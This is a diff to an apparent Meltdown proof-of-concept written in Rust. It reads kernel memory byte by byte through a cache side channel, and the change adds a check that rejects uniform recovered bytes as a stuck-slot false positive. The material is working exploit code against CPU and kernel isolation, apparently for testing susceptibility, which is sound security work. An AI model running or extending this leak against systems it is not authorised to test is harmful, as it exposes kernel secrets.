@@ -345,6 +345,7 @@ fn run_leak(tries: u32, leak_len: usize, confidence: u32, smoke: bool) {
     write_str(STDOUT_FILENO, "\n");
 
     let mut recovered = 0u32;
+    let mut bytes = [0u8; LEAK_LEN];
     for off in 0..leak_len {
         let addr = KERNEL_TARGET_VA + off;
         let (byte, hits) = recover_byte(addr as *const u8, tries);
@@ -352,6 +353,7 @@ fn run_leak(tries: u32, leak_len: usize, confidence: u32, smoke: bool) {
         if confident {
             recovered += 1;
         }
+        bytes[off] = byte;
         write_str(STDOUT_FILENO, "MELTDOWN_POC:leak off=");
         write_u64(STDOUT_FILENO, off as u64);
         write_str(STDOUT_FILENO, " byte=0x");
@@ -370,19 +372,36 @@ fn run_leak(tries: u32, leak_len: usize, confidence: u32, smoke: bool) {
         );
     }
 
+    // A stuck-hot channel slot — the dominant failure mode of an untuned
+    // CACHE_HIT_THRESHOLD on real silicon — recovers the SAME byte at every
+    // offset with high "confidence". Real kernel-image memory (.text at the PIE
+    // base) is varied, so a uniform recovery is a cache artifact, NOT a leak.
+    // Require the recovered run to be non-uniform before declaring a leak — this
+    // is what keeps the PoC from crying wolf on a Meltdown-immune (`rdcl_no`)
+    // CPU where the read is hardware-blocked yet the channel still has a
+    // consistently-warm slot (the Dell/Tiger Lake `0xdb`×16 false positive).
+    let uniform = leak_len > 1 && bytes[..leak_len].iter().all(|&b| b == bytes[0]);
+
     if smoke {
         write_str(
             STDOUT_FILENO,
             "MELTDOWN_POC:smoke (verdict suppressed — no cache model under TCG)\n",
         );
-    } else if recovered >= 1 {
+    } else if recovered >= 1 && !uniform {
         write_str(STDOUT_FILENO, "MELTDOWN_POC:LEAK bytes=");
         write_u64(STDOUT_FILENO, u64::from(recovered));
         write_str(STDOUT_FILENO, "/");
         write_u64(STDOUT_FILENO, leak_len as u64);
         write_str(
             STDOUT_FILENO,
-            " (kernel memory recovered — KPTI OFF / susceptible silicon)\n",
+            " (varied kernel memory recovered — KPTI OFF / susceptible silicon)\n",
+        );
+    } else if uniform {
+        // High-confidence but uniform → the artifact path.
+        write_str(
+            STDOUT_FILENO,
+            "MELTDOWN_POC:NO-LEAK (uniform recovery = stuck-slot cache artifact, not memory; \
+             CPU not susceptible / rdcl_no, or tune CACHE_HIT_THRESHOLD)\n",
         );
     } else {
         write_str(
